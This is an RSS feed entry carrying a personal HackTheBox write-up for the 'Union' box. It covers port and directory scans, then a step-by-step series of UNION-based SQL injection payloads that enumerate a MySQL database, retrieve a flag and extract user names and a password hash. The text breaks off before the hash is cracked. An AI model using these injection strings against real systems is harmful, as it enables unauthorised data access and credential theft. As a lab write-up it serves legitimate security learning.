<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0">
    <channel>
      <title>Cardboard Iguana Security</title>
      <link>https://cardboard-iguana.com/grimoire</link>
      <description>Commentary and tales from Cardboard Iguana Security</description>
      <generator>Quartz -- quartz.jzhao.xyz</generator>
      <item>
    <title>Union</title>
    <link>https://cardboard-iguana.com/grimoire/tales/2023-04-27-union</link>
    <guid>https://cardboard-iguana.com/grimoire/tales/2023-04-27-union</guid>
    <description>&lt;blockquote class=&quot;callout info&quot; data-callout=&quot;info&quot;&gt;
&lt;div class=&quot;callout-title&quot;&gt;
                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;
                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;INFO&lt;/p&gt;&lt;/div&gt;
                  
                &lt;/div&gt;
&lt;div class=&quot;callout-content&quot;&gt;
&lt;p&gt;I joined the Discord server for the team I worked on this with ~35 minutes late, as I was having trouble setting up the HackTheBox VPN (the solution was to change my VPN region to EU, then back to US, and &lt;em&gt;then&lt;/em&gt; re-download the .ovpn file), and then didn’t have the right invite link!&lt;/p&gt;
&lt;p&gt;Anyways, this was my first box in a &lt;em&gt;long&lt;/em&gt; time, and boy am I rusty!&lt;/p&gt;
&lt;/div&gt;
&lt;/blockquote&gt;
&lt;p&gt;The target IP is 10.129.202.139 (at least initially). The index.php page seems to accept any input (&lt;code&gt;player=foo&lt;/code&gt;), and directs the “player” to the challenge.php page. There’s a single-element form here, but it doesn’t seem to do anything on submission (&lt;code&gt;flag=bar&lt;/code&gt;)?&lt;/p&gt;
&lt;p&gt;Running &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/gobuster&quot; class=&quot;internal&quot; data-slug=&quot;spells/gobuster&quot;&gt;gobuster&lt;/a&gt; to try to enumerate potentially common directories:&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;gobuster&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -t&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#2F798A&quot;&gt; 50&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; dir&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -u&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; http://10.129.202.139&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -w&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; /usr/share/wordlists/dirb/common.txt&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;Results:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/css       → /css/
/index.php
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Not much help there. Let’s try the same thing with some common extensions:&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;gobuster&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -t&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#2F798A&quot;&gt; 50&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; dir&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -u&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; http://10.129.202.139&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt;         -w&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; /usr/share/wordlists/dirb/common.txt&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt;         -x&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; .php,.html,.htm,.txt,.md,.js,.css&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;Results:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/config.php
/css          → /css/
/firewall.php
/index.php
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;a href=&quot;https://www.freecodecamp.org/news/gobuster-tutorial-find-hidden-directories-sub-domains-and-s3-buckets/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;A general reminder about how to use gobuster.&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;The /config.php and /firewall.php files look interesting!&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;/config.php just returns a zero-length document. Booo!&lt;/li&gt;
&lt;li&gt;/firewall.php just returns &lt;code&gt;Access Denied&lt;/code&gt; .&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Alright, let’s try &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/nmap&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/nmap&quot;&gt;Nmap&lt;/a&gt;:&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;sudo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; nmap&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -v&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -oN&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; union&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -Pn&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -A&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; --reason&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -T4&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -p-&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#2F798A&quot;&gt; 10.129.202.139&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;Output:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Host discovery disabled (-Pn). All addresses will be marked &#039;up&#039; and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-27 19:24 MDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 19:24
Completed NSE at 19:24, 0.00s elapsed
Initiating NSE at 19:24
Completed NSE at 19:24, 0.00s elapsed
Initiating NSE at 19:24
Completed NSE at 19:24, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 19:24
Completed Parallel DNS resolution of 1 host. at 19:24, 0.02s elapsed
Initiating SYN Stealth Scan at 19:24
Scanning 10.129.202.139 [65535 ports]
Discovered open port 80/tcp on 10.129.202.139
SYN Stealth Scan Timing: About 21.06% done; ETC: 19:26 (0:01:56 remaining)
SYN Stealth Scan Timing: About 55.83% done; ETC: 19:26 (0:00:48 remaining)
Completed SYN Stealth Scan at 19:25, 91.51s elapsed (65535 total ports)
Initiating Service scan at 19:25
Scanning 1 service on 10.129.202.139
Completed Service scan at 19:26, 6.12s elapsed (1 service on 1 host)
Initiating OS detection (try #1) against 10.129.202.139
Retrying OS detection (try #2) against 10.129.202.139
Initiating Traceroute at 19:26
Completed Traceroute at 19:26, 0.07s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 19:26
Completed Parallel DNS resolution of 2 hosts. at 19:26, 0.02s elapsed
NSE: Script scanning 10.129.202.139.
Initiating NSE at 19:26
Completed NSE at 19:26, 5.07s elapsed
Initiating NSE at 19:26
Completed NSE at 19:26, 0.22s elapsed
Initiating NSE at 19:26
Completed NSE at 19:26, 0.00s elapsed
Nmap scan report for 10.129.202.139
Host is up, received user-set (0.058s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|http-server-header: nginx/1.18.0 (Ubuntu)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|      httponly flag not set
| http-methods:
|_  Supported Methods: GET HEAD POST
|_http-title: Site doesn&#039;t have a title (text/html; charset=UTF-8).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.32 (94%), Linux 4.15 - 5.6 (92%), Linux 5.0 - 5.4 (91%), Linux 5.3 - 5.4 (91%), Linux 5.0 (90%), Linux 5.0 - 5.3 (90%), Linux 5.4 (90%), Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 27.153 days (since Fri Mar 31 15:46:21 2023)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   63.08 ms 10.10.14.1
2   63.24 ms 10.129.202.139

NSE: Script Post-scanning.
Initiating NSE at 19:26
Completed NSE at 19:26, 0.00s elapsed
Initiating NSE at 19:26
Completed NSE at 19:26, 0.00s elapsed
Initiating NSE at 19:26
Completed NSE at 19:26, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 107.94 seconds
           Raw packets sent: 131215 (5.777MB) | Rcvd: 251 (19.772KB)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Well, that’s less than helpful; we already knew that there was a web server running on port 80 (and there’s nothing else).&lt;/p&gt;
&lt;p&gt;Okay, let’s try fuzzing the two pages with &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/burp-suite&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/burp-suite&quot;&gt;Burp Suite&lt;/a&gt; and see what we get! Interesting observations…&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;/index.php
&lt;ol&gt;
&lt;li&gt;Submitting hexadecimal numbers for &lt;code&gt;player&lt;/code&gt; (for example, 0x0 or 0xabad1dea) result in only the &lt;em&gt;first&lt;/em&gt; half of the normal response, without any HTML or the /challenge.php link.&lt;/li&gt;
&lt;li&gt;You can insert any HTML you’d like, and it gets rendered back in the page.&lt;/li&gt;
&lt;li&gt;Inputs always seem to be lower-cased before they’re returned.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&#039; OR 1=1 -- 1&lt;/code&gt; and &lt;code&gt;&#039; OR &#039;1&#039;=&#039;1&lt;/code&gt; are &lt;em&gt;also&lt;/em&gt; missing the second half of the response, like the 0x numbers. So maybe we have &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/sql-injection-attacks&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/sql-injection-attacks&quot;&gt;SQL injection&lt;/a&gt;?&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;/challenge.php returns nothing interesting…&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;(I really need a more targeted fuzzing list than the “big list of naughty strings”, as the free version of &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/burp-suite&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/burp-suite&quot;&gt;Burp Suite&lt;/a&gt; throttles Intruder so much that this list takes over 30 minutes to process!)&lt;/p&gt;
&lt;p&gt;(Also, be sure to look at the response in &lt;strong&gt;Raw&lt;/strong&gt; mode to avoid going down bunny trails about formatting changes that ​&lt;em&gt;don’t actually exist in the server response&lt;/em&gt;​!)&lt;/p&gt;
&lt;p&gt;Okay, so not many clues at this point. SQL injection &lt;em&gt;might&lt;/em&gt; be a thing, but the behavior with hexadecimal numbers is… Odd.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;So, here I’m going to “cheat” a bit. I know from the discussion on Discord that SQL injection &lt;em&gt;is&lt;/em&gt; a thing for this box, and is, in fact, how you get the first flag. So even though my evidence at this point is circumstantial/weak, I’m going to go that route.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Since &lt;code&gt;&#039; OR 1=1 -- 1&lt;/code&gt; gave us something interesting, let’s send /index.php to Repeater and see what some other values for &lt;code&gt;player&lt;/code&gt; do for us…&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;&#039; UNION SELECT &#039;&gt;&gt;&gt;STUFF&amp;#x3C;&amp;#x3C;&amp;#x3C;&#039; -- 1&lt;/code&gt; returns &lt;code&gt;&gt;&gt;&gt;STUFF&amp;#x3C;&amp;#x3C;&amp;#x3C;&lt;/code&gt; for the user name!&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&#039; UNION SELECT @@datadir -- 1&lt;/code&gt; returns &lt;code&gt;/var/lib/mysql&lt;/code&gt;, so we’re dealing with &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/mysql&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/mysql&quot;&gt;MySQL&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&#039; UNION SELECT schema_name FROM information_schema.schemata -- 1&lt;/code&gt; returns &lt;code&gt;mysql&lt;/code&gt; … Which isn’t right. It looks like only a single row (probably the last one, given that we only see one row with &lt;code&gt;UNION&lt;/code&gt; ) is returned.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&#039; UNION SELECT schema_name FROM information_schema.schemata LIMIT 1 OFFSET 0 -- 1&lt;/code&gt; also returns &lt;code&gt;mysql&lt;/code&gt; … But using &lt;code&gt;OFFSET 1&lt;/code&gt; returns &lt;code&gt;information_schema&lt;/code&gt; , so I guess we’ll just do it this way. Iterating, we also see databases called &lt;code&gt;performance_schema&lt;/code&gt; , &lt;code&gt;sys&lt;/code&gt; , and &lt;code&gt;november&lt;/code&gt; . All of these are standard &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/mysql&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/mysql&quot;&gt;MySQL&lt;/a&gt; databases except for &lt;code&gt;november&lt;/code&gt; .&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&#039; UNION SELECT database() -- 1&lt;/code&gt; confirms that we’re in the &lt;code&gt;november&lt;/code&gt; database.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&#039; UNION SELECT table_name FROM information_schema.tables WHERE table_schema != &#039;november&#039; LIMIT 1 OFFSET 0 -- 1&lt;/code&gt; returns &lt;code&gt;flag&lt;/code&gt; , and iterating reveals a second table &lt;code&gt;players&lt;/code&gt; . There doesn’t seem to be anything else. The &lt;code&gt;flag&lt;/code&gt; table looks promising, so let’s see what’s there.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&#039; UNION SELECT column_name FROM information_schema.columns WHERE table_schema = &#039;november&#039; and table_name = &#039;flag&#039; LIMIT 1 OFFSET 0 -- 1&lt;/code&gt; (and iterating) reveals that there’s a single column called &lt;code&gt;one&lt;/code&gt; .&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&#039; UNION SELECT COUNT(*) FROM flag -- 1&lt;/code&gt; reveals that there’s only a single row in &lt;code&gt;flag&lt;/code&gt; . Easy!&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&#039; UNION SELECT one FROM flag -- 1&lt;/code&gt; then provides a “flag” value.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;(The above is made possible using &lt;a href=&quot;https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;this handy SQL injection cheat-sheet for MySQL&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;.)&lt;/p&gt;
&lt;p&gt;Now, as it turns out, this is &lt;em&gt;not&lt;/em&gt; a flag for the box! Instead, inputting it into /challenge.php generates the message that &lt;code&gt;Your IP Address has now been granted SSH Access&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Let’s confirm…&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;sudo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; nmap&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -v&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -oN&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; union2&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -Pn&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -A&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; --reason&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -T4&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -p-&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#2F798A&quot;&gt; 10.129.202.139&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;Output:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Host discovery disabled (-Pn). All addresses will be marked &#039;up&#039; and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-27 21:16 MDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 21:16
Completed NSE at 21:16, 0.00s elapsed
Initiating NSE at 21:16
Completed NSE at 21:16, 0.00s elapsed
Initiating NSE at 21:16
Completed NSE at 21:16, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 21:16
Completed Parallel DNS resolution of 1 host. at 21:16, 0.01s elapsed
Initiating SYN Stealth Scan at 21:16
Scanning 10.129.202.139 [65535 ports]
Discovered open port 22/tcp on 10.129.202.139
Discovered open port 80/tcp on 10.129.202.139
Completed SYN Stealth Scan at 21:17, 35.32s elapsed (65535 total ports)
Initiating Service scan at 21:17
Scanning 2 services on 10.129.202.139
Completed Service scan at 21:17, 6.12s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 10.129.202.139
Retrying OS detection (try #2) against 10.129.202.139
Retrying OS detection (try #3) against 10.129.202.139
Retrying OS detection (try #4) against 10.129.202.139
Retrying OS detection (try #5) against 10.129.202.139
Initiating Traceroute at 21:17
Completed Traceroute at 21:17, 0.06s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 21:17
Completed Parallel DNS resolution of 2 hosts. at 21:17, 0.01s elapsed
NSE: Script scanning 10.129.202.139.
Initiating NSE at 21:17
Completed NSE at 21:17, 1.73s elapsed
Initiating NSE at 21:17
Completed NSE at 21:17, 0.27s elapsed
Initiating NSE at 21:17
Completed NSE at 21:17, 0.02s elapsed
Nmap scan report for 10.129.202.139
Host is up, received user-set (0.054s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 ea8421a3224a7df9b525517983a4f5f2 (RSA)
|   256 b8399ef488beaa01732d10fb447f8461 (ECDSA)
|_  256 2221e9f485908745161f733641ee3b32 (ED25519)
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|http-title: Site doesn&#039;t have a title (text/html; charset=UTF-8).
| http-methods:
|  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.18.0 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=4/27%OT=22%CT=1%CU=31913%PV=Y%DS=2%DC=T%G=Y%TM=644B3AD
OS:9%P=aarch64-unknown-linux-gnu)SEQ(SP=100%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS
OS:=A)OPS(O1=M550ST11NW7%O2=M550ST11NW7%O3=M550NNT11NW7%O4=M550ST11NW7%O5=M
OS:550ST11NW7%O6=M550ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE
OS:88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M550NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=
OS:S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q
OS:=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A
OS:%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y
OS:%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T
OS:=40%CD=S)

Uptime guess: 27.230 days (since Fri Mar 31 15:46:20 2023)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=256 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 111/tcp)
HOP RTT      ADDRESS
1   56.02 ms 10.10.14.1
2   56.12 ms 10.129.202.139

NSE: Script Post-scanning.
Initiating NSE at 21:17
Completed NSE at 21:17, 0.00s elapsed
Initiating NSE at 21:17
Completed NSE at 21:17, 0.00s elapsed
Initiating NSE at 21:17
Completed NSE at 21:17, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.07 seconds
           Raw packets sent: 66144 (2.914MB) | Rcvd: 65710 (2.632MB)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;So, we definitely have an open &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/ssh&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/ssh&quot;&gt;SSH&lt;/a&gt; port now! But what user to use?&lt;/p&gt;
&lt;p&gt;Maybe there’s password re-use with &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/mysql&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/mysql&quot;&gt;MySQL&lt;/a&gt;? Let’s see what we’ve got:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;&#039; UNION SELECT COUNT(*) FROM mysql.user -- 1&lt;/code&gt; shows that we have 6 users.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&#039; UNION SELECT user FROM mysql.user LIMIT 1 OFFSET 0 -- 1&lt;/code&gt; (and iterating) shows that these users are &lt;code&gt;debian-sys-maint&lt;/code&gt;, &lt;code&gt;mysql.infoschema&lt;/code&gt;, &lt;code&gt;mysql.session&lt;/code&gt;, &lt;code&gt;mysql.sys&lt;/code&gt;, &lt;code&gt;root&lt;/code&gt;, and &lt;code&gt;uhc&lt;/code&gt;. Both &lt;code&gt;root&lt;/code&gt; and &lt;code&gt;uhc&lt;/code&gt; look promising.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&#039; UNION SELECT host FROM mysql.user WHERE user = &#039;root&#039; -- 1&lt;/code&gt; (and &lt;code&gt;uhc&lt;/code&gt;) shows that both are permitted to login from &lt;code&gt;localhost&lt;/code&gt; (though that may not mean anything, since this is just database access).&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&#039; UNION SELECT authentication_string FROM mysql.user WHERE user = &#039;root&#039; -- 1&lt;/code&gt; (and &lt;code&gt;uhc&lt;/code&gt;) reveals that &lt;code&gt;root&lt;/code&gt; &lt;em&gt;doesn’t&lt;/em&gt; have a password, but &lt;code&gt;uhc&lt;/code&gt; does have a password hash. (Apparently there’s no &lt;code&gt;password&lt;/code&gt; column in the &lt;code&gt;mysql.users&lt;/code&gt; table anymore; it’s now called &lt;code&gt;authentication_string&lt;/code&gt; per &lt;a href=&quot;https://dev.mysql.com/doc/refman/8.0/en/grant-tables.html#grant-tables-user-db&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;the documentation&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;.)&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Unfortunately, it turns out that we can’t just feed this hash into &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/john-the-ripper&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/john-the-ripper&quot;&gt;john&lt;/a&gt; or &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/hashcat&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/hashcat&quot;&gt;Hashcat&lt;/a&gt;, but need to &lt;a href=&quot;https://www.percona.com/blog/brute-force-mysql-password-from-a-hash/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;massage things a bit first&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;ol&gt;
